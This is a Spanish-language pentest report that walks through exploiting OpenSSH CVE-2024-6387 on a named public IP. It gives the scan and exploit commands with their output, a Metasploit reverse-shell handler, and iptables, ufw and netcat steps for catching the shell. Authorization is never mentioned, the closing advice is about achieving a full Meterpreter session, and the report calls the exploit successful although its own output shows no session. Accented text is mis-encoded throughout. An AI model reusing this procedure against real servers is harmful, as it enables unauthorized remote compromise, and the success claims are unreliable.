**Informe de Pentesting: Evaluaci√≥n de Vulnerabilidad CVE-2024-6387**

---

## **1. Introducci√≥n**
Este informe documenta la evaluaci√≥n de seguridad realizada en un servidor SSH afectado por la vulnerabilidad CVE-2024-6387, la cual impacta versiones de OpenSSH anteriores a 4.4p1 y desde 8.5p1 hasta antes de 9.8p1. Se realiz√≥ un escaneo para verificar la vulnerabilidad, seguido de la ejecuci√≥n de un exploit con el fin de comprobar su efectividad y la posibilidad de obtener acceso no autorizado al sistema.

## **2. Informaci√≥n del Objetivo**
- **Direcci√≥n IP**: 18.235.237.96
- **Puerto SSH en uso**: 3853
- **Versi√≥n de SSH**: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5

## **3. Identificaci√≥n de la Vulnerabilidad**
Se realiz√≥ un escaneo con la herramienta CVE-2024-6387.py para identificar la vulnerabilidad en el servidor objetivo.

**Comando utilizado:**
```bash
python3 CVE-2024-6387.py scan -T 18.235.237.96 -p 3853
```

**Resultados obtenidos:**
```
üö®Servers likely vulnerable: 1
   [+] Server at 18.235.237.96 (N/A):3853 (running SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5)

üõ°Ô∏è Servers not vulnerable: 0
üõ°Ô∏è Servers likely not vulnerable (possible LoginGraceTime remediation): 0
‚ö†Ô∏è Servers with unknown SSH version: 0

Summary:
üìä Total scanned hosts: 1
üö® Total vulnerable hosts: 1
üõ°Ô∏è  Total not vulnerable hosts: 0
üõ°Ô∏è  Total likely not vulnerable hosts: 0
‚ö†Ô∏è  Total unknown hosts: 0
üîí Servers with port 3853 closed: 0
```

Dado que la versi√≥n analizada est√° dentro del rango afectado, se confirm√≥ la vulnerabilidad.

## **4. Ejecuci√≥n del Exploit**
Con la vulnerabilidad confirmada, se ejecut√≥ el exploit para intentar obtener acceso.

**Comando utilizado:**
```bash
sudo python3 CVE-2024-6387.py exploit -T 18.235.237.96 -p 3853 -n ens33
```

**Resultados obtenidos:**
```
Attempting exploitation with glibc base: 0xb7200000
Attempt 0 of 20000
Received SSH version: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
Received KEX_INIT (1024 bytes)
Estimated parsing time: -0.000002 seconds
Connection closed by server - possible successful exploitation
Possible exploitation success on attempt 0 with glibc base 0xb7200000!
Exploitation successful!
```

## **5. Captura de la Shell Reversa**
Para capturar una sesi√≥n interactiva, se configur√≥ Metasploit para recibir la conexi√≥n reversa.

**Comando utilizado en Metasploit:**
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.131; set LPORT 9999; exploit -j"
```

**Resultados obtenidos:**
```
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
LHOST => 192.168.56.131
LPORT => 9999
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.56.131:9999 
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> sessions

Active sessions
===============

No active sessions.
```

## **6. Problemas Identificados y Posibles Soluciones**

### **6.1. Posible Problema de Red**
- Al ejecutar el exploit en una m√°quina virtual con red NAT, el ataque funcion√≥, pero la shell reversa no se captur√≥.
- Al cambiar a adaptador puente, el exploit dej√≥ de funcionar.
- En una m√°quina f√≠sica, los resultados fueron los mismos que con la VM en adaptador puente.

**Soluci√≥n Propuesta:**
Configurar el reenv√≠o de puertos o utilizar dos m√°quinas diferentes:
1. Ejecutar el exploit desde una m√°quina.
2. Configurar una segunda m√°quina para escuchar la conexi√≥n reversa.
3. Redirigir el puerto en el router si se ejecuta desde una red externa.

**Ejemplo de configuraci√≥n de reenv√≠o de puertos con iptables:**
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 3853 -j DNAT --to-destination 192.168.56.131:9999
sudo iptables -A FORWARD -p tcp --dport 9999 -j ACCEPT
```

### **6.2. Verificaci√≥n del Firewall**
- Asegurar que no haya reglas de firewall bloqueando la conexi√≥n entrante al puerto 9999.
- Comprobar con:
```bash
sudo iptables -L -n
sudo ufw status
```
- Si est√° bloqueado, permitir el puerto:
```bash
sudo ufw allow 9999/tcp
```

### **6.3. Alternativa: Uso de Netcat para Depuraci√≥n**
Para verificar si el problema es con Metasploit, usar Netcat:
```bash
nc -lvnp 9999
```
Ejecutar el exploit y comprobar si la conexi√≥n llega a Netcat.

## **7. Conclusi√≥n**
Se verific√≥ que el servidor es vulnerable a CVE-2024-6387 y el exploit parece ejecutarse correctamente, pero la captura de la shell reversa presenta dificultades debido a configuraciones de red y firewall. Se recomienda:
- Utilizar una m√°quina separada para escuchar la conexi√≥n reversa.
- Configurar correctamente el reenv√≠o de puertos.
- Verificar reglas de firewall y ajustar si es necesario.
- Usar Netcat para probar la conexi√≥n antes de Metasploit.

Con los ajustes adecuados, se podr√≠a lograr una explotaci√≥n completa con sesi√≥n activa en Meterpreter.

